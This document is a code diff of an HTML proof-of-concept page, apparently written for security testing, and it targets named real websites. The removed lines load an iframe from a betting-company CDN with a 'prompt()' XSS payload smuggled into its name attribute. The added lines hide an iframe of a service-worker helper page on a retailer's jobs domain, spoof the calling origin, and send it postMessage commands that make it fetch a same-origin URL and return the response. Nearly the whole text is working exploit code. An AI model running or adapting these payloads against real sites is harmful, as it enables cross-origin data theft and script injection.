@@ -1,11 +1,40 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
-  <iframe
-    src="https://cdn.dvc.americanwagering.com/ss.html"
-    name='ss:${prompt(555)}:prompt(444)'
-    width="800"
-    height="600">
-  </iframe>
+<h3>Output:</h3>
+<pre id="out">Waiting for SW to register (~3s)...</pre>
+<iframe id="sw" style="display:none"
+  src="https://jobs-pixal-web.ah.nl/_/service_worker/63b0/sw_iframe.html?origin=https://ihatedota.com&1p=1">
+</iframe>
+<script>
+const TARGET = 'https://jobs-pixal-web.ah.nl';
+const out = document.getElementById('out');
+
+window.addEventListener('message', e => {
+  if (e.origin === TARGET) {
+    out.textContent = JSON.stringify(e.data, null, 2);
+    console.log('SW response:', e.data);
+  }
+});
+
+document.getElementById('sw').addEventListener('load', () => {
+  setTimeout(() => {
+    out.textContent = 'SW ready — sending fetch command...';
+    document.getElementById('sw').contentWindow.postMessage({
+      clientId: '1',
+      type: 1,
+      command: {
+        commandType: 0,
+        params: {
+          url: TARGET + '/_/service_worker/63b0/sw.js',
+          method: 0,
+          processResponse: true,
+          templates: {}
+        }
+      }
+    }, TARGET);
+  }, 3000);
+});
+</script>
 </body>
 </html>
